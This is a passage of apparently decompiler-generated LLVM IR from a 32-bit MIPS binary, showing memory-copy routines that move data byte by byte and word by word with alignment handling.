  %v7_40790429 = inttoptr i32 %v0_4078fc25 to i8*
  store i8 %v2_4078f823, i8* %v7_40790429, align 1
  br i1 %v2_40790428, label %dec_label_pc_40790c, label %dec_label_pc_4078f8.dec_label_pc_4078f8_crit_edge

dec_label_pc_4078f8.dec_label_pc_4078f8_crit_edge: ; preds = %dec_label_pc_4078f8.preheader, %dec_label_pc_4078f8.dec_label_pc_4078f8_crit_edge
  %v0_4078f8.pre = load i32, i32* %a1.global-to-local, align 4
  %v1_407904.pre = load i32, i32* @a3, align 4
  %v1_4078f8 = inttoptr i32 %v0_4078f8.pre to i8*
  %v2_4078f8 = load i8, i8* %v1_4078f8, align 1
  %v3_4078f8 = sext i8 %v2_4078f8 to i32
  store i32 %v3_4078f8, i32* %t0.global-to-local, align 4
  %v0_4078fc = load i32, i32* %a0.global-to-local, align 4
  %v1_4078fc = add i32 %v0_4078fc, 1
  store i32 %v1_4078fc, i32* %a0.global-to-local, align 4
  %v1_407900 = add i32 %v0_4078f8.pre, 1
  store i32 %v1_407900, i32* %a1.global-to-local, align 4
  %v2_407904 = icmp eq i32 %v1_407900, %v1_407904.pre
  %v7_407904 = inttoptr i32 %v0_4078fc to i8*
  store i8 %v2_4078f8, i8* %v7_407904, align 1
  br i1 %v2_407904, label %dec_label_pc_40790c, label %dec_label_pc_4078f8.dec_label_pc_4078f8_crit_edge

dec_label_pc_40790c:                              ; preds = %dec_label_pc_4078f8.preheader, %dec_label_pc_4078f8.dec_label_pc_4078f8_crit_edge, %dec_label_pc_4078f0
  ret i32 %v2_407834

dec_label_pc_407914:                              ; preds = %dec_label_pc_407838
  %v1_407914 = sub i32 0, %v2_407834
  %v1_407918 = urem i32 %v1_407914, 4
  store i32 %v1_407918, i32* %a3.global-to-local, align 4
  %v1_40791c = icmp eq i32 %v1_407918, 0
  %v4_40791c = sub i32 %v0_407830, %v1_407918
  store i32 %v4_40791c, i32* %a2.global-to-local, align 4
  br i1 %v1_40791c, label %dec_label_pc_407938, label %dec_label_pc_407920

dec_label_pc_407920:                              ; preds = %dec_label_pc_407914
  %v2_40792c = add i32 %v0_40783c, %v1_407918
  store i32 %v2_40792c, i32* %a1.global-to-local, align 4
  %v2_407934 = add i32 %v1_407918, %v2_407834
  store i32 %v2_407934, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407938

dec_label_pc_407938:                              ; preds = %dec_label_pc_407914, %dec_label_pc_407920
  %v0_40794c3 = phi i32 [ %v2_407834, %dec_label_pc_407914 ], [ %v2_407934, %dec_label_pc_407920 ]
  %v1_407940 = phi i32 [ %v0_40783c, %dec_label_pc_407914 ], [ %v2_40792c, %dec_label_pc_407920 ]
  %v1_407938 = urem i32 %v4_40791c, 4
  store i32 %v1_407938, i32* %t0.global-to-local, align 4
  %v2_40793c = sub i32 %v4_40791c, %v1_407938
  %v2_407940 = add i32 %v1_407940, %v2_40793c
  store i32 %v2_407940, i32* @a3, align 4
  %v1_40794c37 = add i32 %v0_40794c3, 4
  store i32 %v1_40794c37, i32* %a0.global-to-local, align 4
  %v1_40795038 = add i32 %v1_407940, 4
  store i32 %v1_40795038, i32* %a1.global-to-local, align 4
  %v2_40795439 = icmp eq i32 %v1_40795038, %v2_407940
  %v6_40795440 = inttoptr i32 %v0_40794c3 to i32*
  store i32 %v3_407844, i32* %v6_40795440, align 4
  br i1 %v2_40795439, label %dec_label_pc_407958, label %dec_label_pc_407944.dec_label_pc_407944_crit_edge

dec_label_pc_407944.dec_label_pc_407944_crit_edge: ; preds = %dec_label_pc_407938, %dec_label_pc_407944.dec_label_pc_407944_crit_edge
  %v0_40794c.pre = load i32, i32* %a0.global-to-local, align 4
  %v0_407950.pre = load i32, i32* %a1.global-to-local, align 4
  %v1_407954.pre = load i32, i32* @a3, align 4
  %v3_407954.pre = load i32, i32* %t1.global-to-local, align 4
  %v1_40794c = add i32 %v0_40794c.pre, 4
  store i32 %v1_40794c, i32* %a0.global-to-local, align 4
  %v1_407950 = add i32 %v0_407950.pre, 4
  store i32 %v1_407950, i32* %a1.global-to-local, align 4
  %v2_407954 = icmp eq i32 %v1_407950, %v1_407954.pre
  %v6_407954 = inttoptr i32 %v0_40794c.pre to i32*
  store i32 %v3_407954.pre, i32* %v6_407954, align 4
  br i1 %v2_407954, label %dec_label_pc_407958, label %dec_label_pc_407944.dec_label_pc_407944_crit_edge

dec_label_pc_407958:                              ; preds = %dec_label_pc_407944.dec_label_pc_407944_crit_edge, %dec_label_pc_407938
  %v0_407960 = load i32, i32* %t0.global-to-local, align 4
  store i32 %v0_407960, i32* %a2.global-to-local, align 4
  ret i32 %v2_407834

; uselistorder directives
  uselistorder i32 %v0_40794c.pre, { 1, 0 }
  uselistorder i32 %v1_407938, { 1, 0 }
  uselistorder i32 %v4_40791c, { 1, 0, 2 }
  uselistorder i32 %v1_407918, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_4078f8.pre, { 1, 0 }
  uselistorder i32 %v0_4078dc.pre, { 1, 0 }
  uselistorder i32 %v1_4078c8, { 3, 1, 2, 0 }
  uselistorder i32 %v0_4078c8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_4078a0, { 0, 2, 1, 4, 3, 6, 5, 8, 7 }
  uselistorder i32 %v0_40789c, { 1, 0 }
  uselistorder i32 %v1_407868, { 3, 1, 2, 0 }
  uselistorder i32 %v1_407874, { 1, 0 }
  uselistorder i32 %v4_407850, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_40784c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v3_407844, { 1, 0, 2 }
  uselistorder i32 %v1_407840, { 1, 0 }
  uselistorder i32 %v0_40783c, { 4, 0, 3, 1, 5, 2 }
  uselistorder i32 %v2_407834, { 6, 4, 0, 5, 7, 3, 1, 2 }
  uselistorder i32 %v0_407830, { 2, 0, 1, 3 }
  uselistorder i32* %t1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %t0.global-to-local, { 0, 1, 2, 9, 3, 10, 4, 5, 6, 7, 8 }
  uselistorder i32* %a2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32* %a1.global-to-local, { 2, 16, 17, 3, 4, 11, 12, 14, 5, 13, 15, 9, 7, 6, 8, 10, 0, 1 }
  uselistorder i32* %a0.global-to-local, { 2, 22, 23, 3, 4, 17, 18, 19, 5, 20, 21, 15, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 0, 1 }
  uselistorder label %dec_label_pc_407944.dec_label_pc_407944_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_407938, { 1, 0 }
  uselistorder label %dec_label_pc_40790c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_4078f8.dec_label_pc_4078f8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_4078dc.dec_label_pc_4078dc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_407868, { 1, 0 }
}

define i32 @function_407970(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407970:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t1.global-to-local = alloca i32, align 4
  %t2.global-to-local = alloca i32, align 4
  %t3.global-to-local = alloca i32, align 4
  %t4.global-to-local = alloca i32, align 4
  %t5.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %a2.global-to-local, align 4
  store i32 %arg2, i32* %a1.global-to-local, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %v1_407978 = load i32, i32* @t9, align 4
  %v2_407978 = add i32 %v1_407978, 301152
  store i32 %v2_407978, i32* %gp.global-to-local, align 4
  %v2_40798c = sub i32 %arg1, %arg2
  %v2_407990 = icmp ult i32 %v2_40798c, %arg3
  %v3_407990 = zext i1 %v2_407990 to i32
  store i32 %v3_407990, i32* %v0.global-to-local, align 4
  store i32 %arg1, i32* %s0.global-to-local, align 4
  store i32 %arg3, i32* %v1.global-to-local, align 4
  br i1 %v2_407990, label %dec_label_pc_4079bc, label %dec_label_pc_40799c

dec_label_pc_40799c:                              ; preds = %dec_label_pc_407970
  %v1_4079a8 = call i32 @unknown_0()
  store i32 %v2_407978, i32* %gp.global-to-local, align 4
  %v0_4079b8 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_4079b8, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4079bc

dec_label_pc_4079bc:                              ; preds = %dec_label_pc_407970, %dec_label_pc_40799c
  %v1_4079bc = icmp ult i32 %arg3, 16
  %v2_4079bc = zext i1 %v1_4079bc to i32
  store i32 %v2_4079bc, i32* %v0.global-to-local, align 4
  %v2_4079c0 = add i32 %arg3, %arg2
  store i32 %v2_4079c0, i32* %a1.global-to-local, align 4
  %v4_4079c4 = add i32 %arg3, %arg1
  store i32 %v4_4079c4, i32* %t2.global-to-local, align 4
  br i1 %v1_4079bc, label %dec_label_pc_4079bc.dec_label_pc_407c68_crit_edge, label %dec_label_pc_4079c8

dec_label_pc_4079bc.dec_label_pc_407c68_crit_edge: ; preds = %dec_label_pc_4079bc
  %v0_407c6c.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_407c68

dec_label_pc_4079c8:                              ; preds = %dec_label_pc_4079bc
  %v1_4079cc = urem i32 %v4_4079c4, 4
  store i32 %v1_4079cc, i32* %v0.global-to-local, align 4
  %v2_4079d0 = sub i32 %arg3, %v1_4079cc
  store i32 %v2_4079d0, i32* %a2.global-to-local, align 4
  store i32 %v1_4079cc, i32* %v1.global-to-local, align 4
  %v1_4079dc30 = add i32 %v2_4079c0, -1
  store i32 %v1_4079dc30, i32* %a1.global-to-local, align 4
  %v1_4079e031 = inttoptr i32 %v1_4079dc30 to i8*
  %v2_4079e032 = load i8, i8* %v1_4079e031, align 1
  %v3_4079e033 = zext i8 %v2_4079e032 to i32
  store i32 %v3_4079e033, i32* %v0.global-to-local, align 4
  %v1_4079e434 = add i32 %v4_4079c4, -1
  store i32 %v1_4079e434, i32* %t2.global-to-local, align 4
  %v3_4079e835 = inttoptr i32 %v1_4079e434 to i8*
  store i8 %v2_4079e032, i8* %v3_4079e835, align 1
  %v0_4079ec36 = load i32, i32* %v1.global-to-local, align 4
  %v1_4079ec37 = icmp eq i32 %v0_4079ec36, 0
  %v3_4079ec38 = add i32 %v0_4079ec36, -1
  store i32 %v3_4079ec38, i32* %v1.global-to-local, align 4
  %v0_4079f439 = load i32, i32* %a1.global-to-local, align 4
  br i1 %v1_4079ec37, label %dec_label_pc_4079f0, label %dec_label_pc_4079dc.dec_label_pc_4079dc_crit_edge

dec_label_pc_4079dc.dec_label_pc_4079dc_crit_edge: ; preds = %dec_label_pc_4079c8, %dec_label_pc_4079dc.dec_label_pc_4079dc_crit_edge
  %v0_4079f440 = phi i32 [ %v0_4079f4, %dec_label_pc_4079dc.dec_label_pc_4079dc_crit_edge ], [ %v0_4079f439, %dec_label_pc_4079c8 ]
  %v0_4079e4.pre = load i32, i32* %t2.global-to-local, align 4
  %v1_4079dc = add i32 %v0_4079f440, -1
  store i32 %v1_4079dc, i32* %a1.global-to-local, align 4
  %v1_4079e0 = inttoptr i32 %v1_4079dc to i8*
  %v2_4079e0 = load i8, i8* %v1_4079e0, align 1
  %v3_4079e0 = zext i8 %v2_4079e0 to i32
  store i32 %v3_4079e0, i32* %v0.global-to-local, align 4
  %v1_4079e4 = add i32 %v0_4079e4.pre, -1
  store i32 %v1_4079e4, i32* %t2.global-to-local, align 4
  %v3_4079e8 = inttoptr i32 %v1_4079e4 to i8*
  store i8 %v2_4079e0, i8* %v3_4079e8, align 1
  %v0_4079ec = load i32, i32* %v1.global-to-local, align 4
  %v1_4079ec = icmp eq i32 %v0_4079ec, 0
  %v3_4079ec = add i32 %v0_4079ec, -1
  store i32 %v3_4079ec, i32* %v1.global-to-local, align 4
  %v0_4079f4 = load i32, i32* %a1.global-to-local, align 4
  br i1 %v1_4079ec, label %dec_label_pc_4079f0, label %dec_label_pc_4079dc.dec_label_pc_4079dc_crit_edge

dec_label_pc_4079f0:                              ; preds = %dec_label_pc_4079dc.dec_label_pc_4079dc_crit_edge, %dec_label_pc_4079c8
  %v0_4079f4.lcssa = phi i32 [ %v0_4079f439, %dec_label_pc_4079c8 ], [ %v0_4079f4, %dec_label_pc_4079dc.dec_label_pc_4079dc_crit_edge ]
  %v1_4079f4 = urem i32 %v0_4079f4.lcssa, 4
  store i32 %v1_4079f4, i32* %v0.global-to-local, align 4
  %v1_4079f8 = icmp eq i32 %v1_4079f4, 0
  %v2_4079f8 = load i32, i32* %a2.global-to-local, align 4
  %v3_4079f8 = udiv i32 %v2_4079f8, 4
  store i32 %v3_4079f8, i32* %a3.global-to-local, align 4
  br i1 %v1_4079f8, label %dec_label_pc_4079fc, label %dec_label_pc_407b38

dec_label_pc_4079fc:                              ; preds = %dec_label_pc_4079f0
  %v1_407a00 = urem i32 %v3_4079f8, 8
  store i32 %v1_407a00, i32* %t1.global-to-local, align 4
  store i32 %v0_4079f4.lcssa, i32* %a0.global-to-local, align 4
  store i32 %v3_4079f8, i32* %t0.global-to-local, align 4
  %v1_407a1c = mul nuw nsw i32 %v1_407a00, 4
  store i32 ptrtoint (i32* @global_var_408be0.409 to i32), i32* %v1.global-to-local, align 4
  %v2_407a24 = add i32 %v1_407a1c, ptrtoint (i32* @global_var_408be0.409 to i32)
  store i32 %v2_407a24, i32* %v0.global-to-local, align 4
  %v1_407a28 = inttoptr i32 %v2_407a24 to i32*
  %v2_407a28 = load i32, i32* %v1_407a28, align 4
  %v1_407a30 = load i32, i32* %gp.global-to-local, align 4
  %v2_407a30 = add i32 %v1_407a30, %v2_407a28
  store i32 %v2_407a30, i32* %v0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_407a30)
  store i32 0, i32* %t1.global-to-local, align 4
  %v0_407a44 = load i32, i32* %a1.global-to-local, align 4
  %v1_407a44 = add i32 %v0_407a44, -8
  store i32 %v1_407a44, i32* %a0.global-to-local, align 4
  %v1_407a48 = add i32 %v0_407a44, -4
  %v2_407a48 = inttoptr i32 %v1_407a48 to i32*
  %v3_407a48 = load i32, i32* %v2_407a48, align 4
  store i32 %v3_407a48, i32* %v0.global-to-local, align 4
  %v0_407a4c = load i32, i32* %a3.global-to-local, align 4
  %v1_407a4c = add i32 %v0_407a4c, 6
  store i32 %v1_407a4c, i32* %t0.global-to-local, align 4
  %v0_407a54 = load i32, i32* %t2.global-to-local, align 4
  %v1_407a54 = add i32 %v0_407a54, -4
  store i32 %v1_407a54, i32* %v1.global-to-local, align 4
  %v1_407a58 = add i32 %v0_407a44, -12
  store i32 %v1_407a58, i32* %a0.global-to-local, align 4
  %v3_407a5c = load i32, i32* %v2_407a48, align 4
  store i32 %v3_407a5c, i32* %t1.global-to-local, align 4
  %v1_407a60 = add i32 %v0_407a4c, 5
  store i32 %v1_407a60, i32* %t0.global-to-local, align 4
  %v1_407a68 = add i32 %v0_407a54, -8
  store i32 %v1_407a68, i32* %v1.global-to-local, align 4
  %v1_407a6c = add i32 %v0_407a44, -16
  store i32 %v1_407a6c, i32* %a0.global-to-local, align 4
  %v3_407a70 = load i32, i32* %v2_407a48, align 4
  store i32 %v3_407a70, i32* %v0.global-to-local, align 4
  %v1_407a74 = add i32 %v0_407a4c, 4
  store i32 %v1_407a74, i32* %t0.global-to-local, align 4
  %v1_407a7c = add i32 %v0_407a54, -12
  store i32 %v1_407a7c, i32* %v1.global-to-local, align 4
  %v1_407a80 = add i32 %v0_407a44, -20
  store i32 %v1_407a80, i32* %a0.global-to-local, align 4
  %v3_407a84 = load i32, i32* %v2_407a48, align 4
  store i32 %v3_407a84, i32* %t1.global-to-local, align 4
  %v1_407a88 = add i32 %v0_407a4c, 3
  store i32 %v1_407a88, i32* %t0.global-to-local, align 4
  %v1_407a90 = add i32 %v0_407a54, -16
  store i32 %v1_407a90, i32* %v1.global-to-local, align 4
  %v1_407a94 = add i32 %v0_407a44, -24
  store i32 %v1_407a94, i32* %a0.global-to-local, align 4
  %v3_407a98 = load i32, i32* %v2_407a48, align 4
  store i32 %v3_407a98, i32* %v0.global-to-local, align 4
  %v1_407a9c = add i32 %v0_407a4c, 2
  store i32 %v1_407a9c, i32* %t0.global-to-local, align 4
  %v1_407aa4 = add i32 %v0_407a54, -20
  store i32 %v1_407aa4, i32* %v1.global-to-local, align 4
  %v1_407aa8 = add i32 %v0_407a44, -28
  store i32 %v1_407aa8, i32* %a0.global-to-local, align 4
  %v3_407aac = load i32, i32* %v2_407a48, align 4
  store i32 %v3_407aac, i32* %t1.global-to-local, align 4
  %v1_407ab0 = add i32 %v0_407a4c, 1
  store i32 %v1_407ab0, i32* %t0.global-to-local, align 4
  %v1_407ab8 = add i32 %v0_407a54, -24
  store i32 %v1_407ab8, i32* %v1.global-to-local, align 4
  %v1_407abc = add i32 %v0_407a44, -32
  store i32 %v1_407abc, i32* %a0.global-to-local, align 4
  %v3_407ac0 = load i32, i32* %v2_407a48, align 4
  store i32 %v3_407ac0, i32* %v0.global-to-local, align 4
  %v1_407ac8 = add i32 %v0_407a54, -28
  store i32 %v1_407ac8, i32* %v1.global-to-local, align 4
  %v1_407acc = add i32 %v0_407a44, -36
  store i32 %v1_407acc, i32* %a0.global-to-local, align 4
  %v3_407ad0 = load i32, i32* %v2_407a48, align 4
  store i32 %v3_407ad0, i32* %t1.global-to-local, align 4
  %v1_407ad4 = add i32 %v0_407a4c, -1
  store i32 %v1_407ad4, i32* %t0.global-to-local, align 4
  %v1_407ad8 = add i32 %v0_407a54, -32
  store i32 %v1_407ad8, i32* %v1.global-to-local, align 4
  %v2_407adc = inttoptr i32 %v1_407a44 to i32*
  %v3_407adc = load i32, i32* %v2_407adc, align 4
  store i32 %v3_407adc, i32* %v0.global-to-local, align 4
  %v3_407ae0 = inttoptr i32 %v1_407a54 to i32*
  store i32 %v3_407ad0, i32* %v3_407ae0, align 4
  %v0_407ae4 = load i32, i32* %a0.global-to-local, align 4
  %v1_407ae4 = add i32 %v0_407ae4, 24
  %v2_407ae4 = inttoptr i32 %v1_407ae4 to i32*
  %v3_407ae4 = load i32, i32* %v2_407ae4, align 4
  store i32 %v3_407ae4, i32* %t1.global-to-local, align 4
  %v0_407ae8 = load i32, i32* %v0.global-to-local, align 4
  %v1_407ae8 = load i32, i32* %v1.global-to-local, align 4
  %v2_407ae8 = add i32 %v1_407ae8, 24
  %v3_407ae8 = inttoptr i32 %v2_407ae8 to i32*
  store i32 %v0_407ae8, i32* %v3_407ae8, align 4
  %v0_407aec = load i32, i32* %a0.global-to-local, align 4
  %v1_407aec = add i32 %v0_407aec, 20
  %v2_407aec = inttoptr i32 %v1_407aec to i32*
  %v3_407aec = load i32, i32* %v2_407aec, align 4
  store i32 %v3_407aec, i32* %v0.global-to-local, align 4
  %v0_407af0 = load i32, i32* %t1.global-to-local, align 4
  %v1_407af0 = load i32, i32* %v1.global-to-local, align 4
  %v2_407af0 = add i32 %v1_407af0, 20
  %v3_407af0 = inttoptr i32 %v2_407af0 to i32*
  store i32 %v0_407af0, i32* %v3_407af0, align 4
  %v0_407af4 = load i32, i32* %a0.global-to-local, align 4
  %v1_407af4 = add i32 %v0_407af4, 16
  %v2_407af4 = inttoptr i32 %v1_407af4 to i32*
  %v3_407af4 = load i32, i32* %v2_407af4, align 4
  store i32 %v3_407af4, i32* %t1.global-to-local, align 4
  %v0_407af8 = load i32, i32* %v0.global-to-local, align 4
  %v1_407af8 = load i32, i32* %v1.global-to-local, align 4
  %v2_407af8 = add i32 %v1_407af8, 16
  %v3_407af8 = inttoptr i32 %v2_407af8 to i32*
  store i32 %v0_407af8, i32* %v3_407af8, align 4
  %v0_407afc = load i32, i32* %a0.global-to-local, align 4
  %v1_407afc = add i32 %v0_407afc, 12
  %v2_407afc = inttoptr i32 %v1_407afc to i32*
  %v3_407afc = load i32, i32* %v2_407afc, align 4
  store i32 %v3_407afc, i32* %v0.global-to-local, align 4
  %v0_407b00 = load i32, i32* %t1.global-to-local, align 4
  %v1_407b00 = load i32, i32* %v1.global-to-local, align 4
  %v2_407b00 = add i32 %v1_407b00, 12
  %v3_407b00 = inttoptr i32 %v2_407b00 to i32*
  store i32 %v0_407b00, i32* %v3_407b00, align 4
  %v0_407b04 = load i32, i32* %a0.global-to-local, align 4
  %v1_407b04 = add i32 %v0_407b04, 8
  %v2_407b04 = inttoptr i32 %v1_407b04 to i32*
  %v3_407b04 = load i32, i32* %v2_407b04, align 4
  store i32 %v3_407b04, i32* %t1.global-to-local, align 4
  %v0_407b08 = load i32, i32* %v0.global-to-local, align 4
  %v1_407b08 = load i32, i32* %v1.global-to-local, align 4
  %v2_407b08 = add i32 %v1_407b08, 8
  %v3_407b08 = inttoptr i32 %v2_407b08 to i32*
  store i32 %v0_407b08, i32* %v3_407b08, align 4
  %v0_407b0c = load i32, i32* %a0.global-to-local, align 4
  %v1_407b0c = add i32 %v0_407b0c, 4
  %v2_407b0c = inttoptr i32 %v1_407b0c to i32*
  %v3_407b0c = load i32, i32* %v2_407b0c, align 4
  store i32 %v3_407b0c, i32* %v0.global-to-local, align 4
  %v0_407b10 = load i32, i32* %t1.global-to-local, align 4
  %v1_407b10 = load i32, i32* %v1.global-to-local, align 4
  %v2_407b10 = add i32 %v1_407b10, 4
  %v3_407b10 = inttoptr i32 %v2_407b10 to i32*
  store i32 %v0_407b10, i32* %v3_407b10, align 4
  %v0_407b14 = load i32, i32* %t0.global-to-local, align 4
  %v1_407b14 = add i32 %v0_407b14, -8
  store i32 %v1_407b14, i32* %t0.global-to-local, align 4
  %v0_407b18 = load i32, i32* %a0.global-to-local, align 4
  %v1_407b18 = inttoptr i32 %v0_407b18 to i32*
  %v2_407b18 = load i32, i32* %v1_407b18, align 4
  store i32 %v2_407b18, i32* %t1.global-to-local, align 4
  %v0_407b1c = load i32, i32* %v0.global-to-local, align 4
  %v1_407b1c = load i32, i32* %v1.global-to-local, align 4
  %v2_407b1c = inttoptr i32 %v1_407b1c to i32*
  store i32 %v0_407b1c, i32* %v2_407b1c, align 4
  %v0_407b20 = load i32, i32* %t0.global-to-local, align 4
  %v1_407b20 = icmp eq i32 %v0_407b20, 0
  %v2_407b20 = load i32, i32* %v1.global-to-local, align 4
  %v3_407b20 = add i32 %v2_407b20, -32
  store i32 %v3_407b20, i32* %v1.global-to-local, align 4
  br i1 %v1_407b20, label %dec_label_pc_407b30, label %dec_label_pc_407b24

dec_label_pc_407b24:                              ; preds = %dec_label_pc_4079fc
  %v0_407b2c = load i32, i32* %a0.global-to-local, align 4
  %v1_407b2c = add i32 %v0_407b2c, -32
  store i32 %v1_407b2c, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407b30

dec_label_pc_407b30:                              ; preds = %dec_label_pc_4079fc, %dec_label_pc_407b24
  %v0_407b34 = load i32, i32* %t1.global-to-local, align 4
  %v2_407b34 = add i32 %v2_407b20, -4
  %v3_407b34 = inttoptr i32 %v2_407b34 to i32*
  store i32 %v0_407b34, i32* %v3_407b34, align 4
  %v0_407b38.pre = load i32, i32* %v0.global-to-local, align 4
  %v0_407b40.pre = load i32, i32* %a1.global-to-local, align 4
  %v0_407b48.pre = load i32, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_407b38

dec_label_pc_407b38:                              ; preds = %dec_label_pc_4079f0, %dec_label_pc_407b30
  %v0_407b94 = phi i32 [ %v3_4079f8, %dec_label_pc_4079f0 ], [ %v0_407b48.pre, %dec_label_pc_407b30 ]
  %v0_407b40 = phi i32 [ %v0_4079f4.lcssa, %dec_label_pc_4079f0 ], [ %v0_407b40.pre, %dec_label_pc_407b30 ]
  %v0_407b38 = phi i32 [ %v1_4079f4, %dec_label_pc_4079f0 ], [ %v0_407b38.pre, %dec_label_pc_407b30 ]
  %v1_407b38 = mul i32 %v0_407b38, 8
  store i32 %v1_407b38, i32* %t4.global-to-local, align 4
  %v2_407b40 = and i32 %v0_407b40, -4
  store i32 %v2_407b40, i32* %t0.global-to-local, align 4
  %v1_407b48 = urem i32 %v0_407b94, 4
  store i32 %v1_407b48, i32* %v1.global-to-local, align 4
  %v2_407b4c = sub i32 32, %v1_407b38
  store i32 %v2_407b4c, i32* %t5.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  store i32 %v0_407b94, i32* %t3.global-to-local, align 4
  %v1_407b58 = add i32 %v2_407b40, 4
  store i32 %v1_407b58, i32* %a0.global-to-local, align 4
  %v2_407b5c = icmp eq i32 %v1_407b48, 1
  %v3_407b5c = load i32, i32* %t2.global-to-local, align 4
  store i32 %v3_407b5c, i32* %a3.global-to-local, align 4
  br i1 %v2_407b5c, label %dec_label_pc_407bcc, label %dec_label_pc_407b60

dec_label_pc_407b60:                              ; preds = %dec_label_pc_407b38
  %v1_407b64 = icmp eq i32 %v1_407b48, 0
  store i32 2, i32* %v0.global-to-local, align 4
  br i1 %v1_407b64, label %dec_label_pc_407bb8, label %dec_label_pc_407b68

dec_label_pc_407b68:                              ; preds = %dec_label_pc_407b60
  store i32 3, i32* %v0.global-to-local, align 4
  %trunc = trunc i32 %v0_407b94 to i2
  switch i2 %trunc, label %dec_label_pc_407b78 [
    i2 -2, label %dec_label_pc_407b88
    i2 -1, label %dec_label_pc_407ba0
  ]

dec_label_pc_407b78:                              ; preds = %dec_label_pc_407b68
  store i32 0, i32* %t1.global-to-local, align 4
  store i32 0, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_407b88

dec_label_pc_407b88:                              ; preds = %dec_label_pc_407b68, %dec_label_pc_407b78
  %v0_407b88 = phi i32 [ %v2_407b40, %dec_label_pc_407b68 ], [ 0, %dec_label_pc_407b78 ]
  %v1_407b88 = add i32 %v0_407b88, -8
  store i32 %v1_407b88, i32* %a0.global-to-local, align 4
  %v2_407b8c = inttoptr i32 %v0_407b88 to i32*
  %v3_407b8c = load i32, i32* %v2_407b8c, align 4
  store i32 %v3_407b8c, i32* %t1.global-to-local, align 4
  %v1_407b90 = add i32 %v0_407b88, -4
  %v2_407b90 = inttoptr i32 %v1_407b90 to i32*
  %v3_407b90 = load i32, i32* %v2_407b90, align 4
  store i32 %v3_407b90, i32* %t0.global-to-local, align 4
  %v1_407b94 = add i32 %v0_407b94, 2
  store i32 %v1_407b94, i32* %t3.global-to-local, align 4
  %v1_407b9c = add i32 %v3_407b5c, -4
  store i32 %v1_407b9c, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_407ba0

dec_label_pc_407ba0:                              ; preds = %dec_label_pc_407b68, %dec_label_pc_407b88
  %v0_407bac = phi i32 [ %v1_407b94, %dec_label_pc_407b88 ], [ %v0_407b94, %dec_label_pc_407b68 ]
  %v0_407ba0 = phi i32 [ %v3_407b90, %dec_label_pc_407b88 ], [ %v2_407b40, %dec_label_pc_407b68 ]
  %v1_407ba0 = add i32 %v0_407ba0, -12
  store i32 %v1_407ba0, i32* %a0.global-to-local, align 4
  %v2_407ba4 = inttoptr i32 %v0_407ba0 to i32*
  %v3_407ba4 = load i32, i32* %v2_407ba4, align 4
  store i32 %v3_407ba4, i32* %t0.global-to-local, align 4
  %v1_407ba8 = add i32 %v0_407ba0, -4
  %v2_407ba8 = inttoptr i32 %v1_407ba8 to i32*
  %v3_407ba8 = load i32, i32* %v2_407ba8, align 4
  store i32 %v3_407ba8, i32* %t1.global-to-local, align 4
  %v1_407bac = add i32 %v0_407bac, 1
  store i32 %v1_407bac, i32* %t3.global-to-local, align 4
  %v1_407bb4 = add i32 %v3_407b5c, -8
  store i32 %v1_407bb4, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_407bb8

dec_label_pc_407bb8:                              ; preds = %dec_label_pc_407b60, %dec_label_pc_407ba0
  %v0_407bd811 = phi i32 [ %v0_407b94, %dec_label_pc_407b60 ], [ %v1_407bac, %dec_label_pc_407ba0 ]
  %v0_407bb8 = phi i32 [ %v2_407b40, %dec_label_pc_407b60 ], [ %v3_407ba4, %dec_label_pc_407ba0 ]
  %v1_407bb8 = add i32 %v0_407bb8, -16
  store i32 %v1_407bb8, i32* %a0.global-to-local, align 4
  %v2_407bbc = inttoptr i32 %v0_407bb8 to i32*
  %v3_407bbc = load i32, i32* %v2_407bbc, align 4
  store i32 %v3_407bbc, i32* %t1.global-to-local, align 4
  %v1_407bc0 = add i32 %v0_407bb8, -4
  %v2_407bc0 = inttoptr i32 %v1_407bc0 to i32*
  %v3_407bc0 = load i32, i32* %v2_407bc0, align 4
  store i32 %v3_407bc0, i32* %t0.global-to-local, align 4
  %v1_407bc8 = add i32 %v3_407b5c, -12
  store i32 %v1_407bc8, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_407bcc

dec_label_pc_407bcc:                              ; preds = %dec_label_pc_407b38, %dec_label_pc_407bb8
  %v0_407bd8 = phi i32 [ %v0_407b94, %dec_label_pc_407b38 ], [ %v0_407bd811, %dec_label_pc_407bb8 ]
  %v0_407bcc = phi i32 [ %v2_407b40, %dec_label_pc_407b38 ], [ %v3_407bc0, %dec_label_pc_407bb8 ]
  %v1_407bcc = add i32 %v0_407bcc, -20
  store i32 %v1_407bcc, i32* %a0.global-to-local, align 4
  %v2_407bd0 = inttoptr i32 %v0_407bcc to i32*
  %v3_407bd0 = load i32, i32* %v2_407bd0, align 4
  store i32 %v3_407bd0, i32* %t0.global-to-local, align 4
  %v1_407bd4 = add i32 %v0_407bcc, -4
  %v2_407bd4 = inttoptr i32 %v1_407bd4 to i32*
